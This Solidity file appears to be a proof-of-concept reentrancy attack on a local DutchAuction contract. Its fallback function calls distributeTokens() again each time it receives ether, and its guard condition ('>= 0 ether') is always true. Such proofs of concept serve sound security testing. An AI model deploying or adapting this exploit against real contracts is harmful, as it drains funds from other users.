// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./DutchAuction.sol";
import "./AuctionToken.sol";

contract Attack {
    DutchAuction private dutchAuction;
    AuctionToken private auctionToken;

    constructor(DutchAuction _auctionAddress) {
        dutchAuction = _auctionAddress;
        auctionToken = dutchAuction.getToken();
    }

    fallback() external payable {
        if (auctionToken.balanceOf(address(dutchAuction)) >= 0 ether) {
            dutchAuction.distributeTokens();
        }
    }

    function attack(uint256) external payable {
        //require(msg.value >= 1 ether);
        //dutchAuction.placeBid{value: 1 ether}();
        dutchAuction.distributeTokens();
    }
}
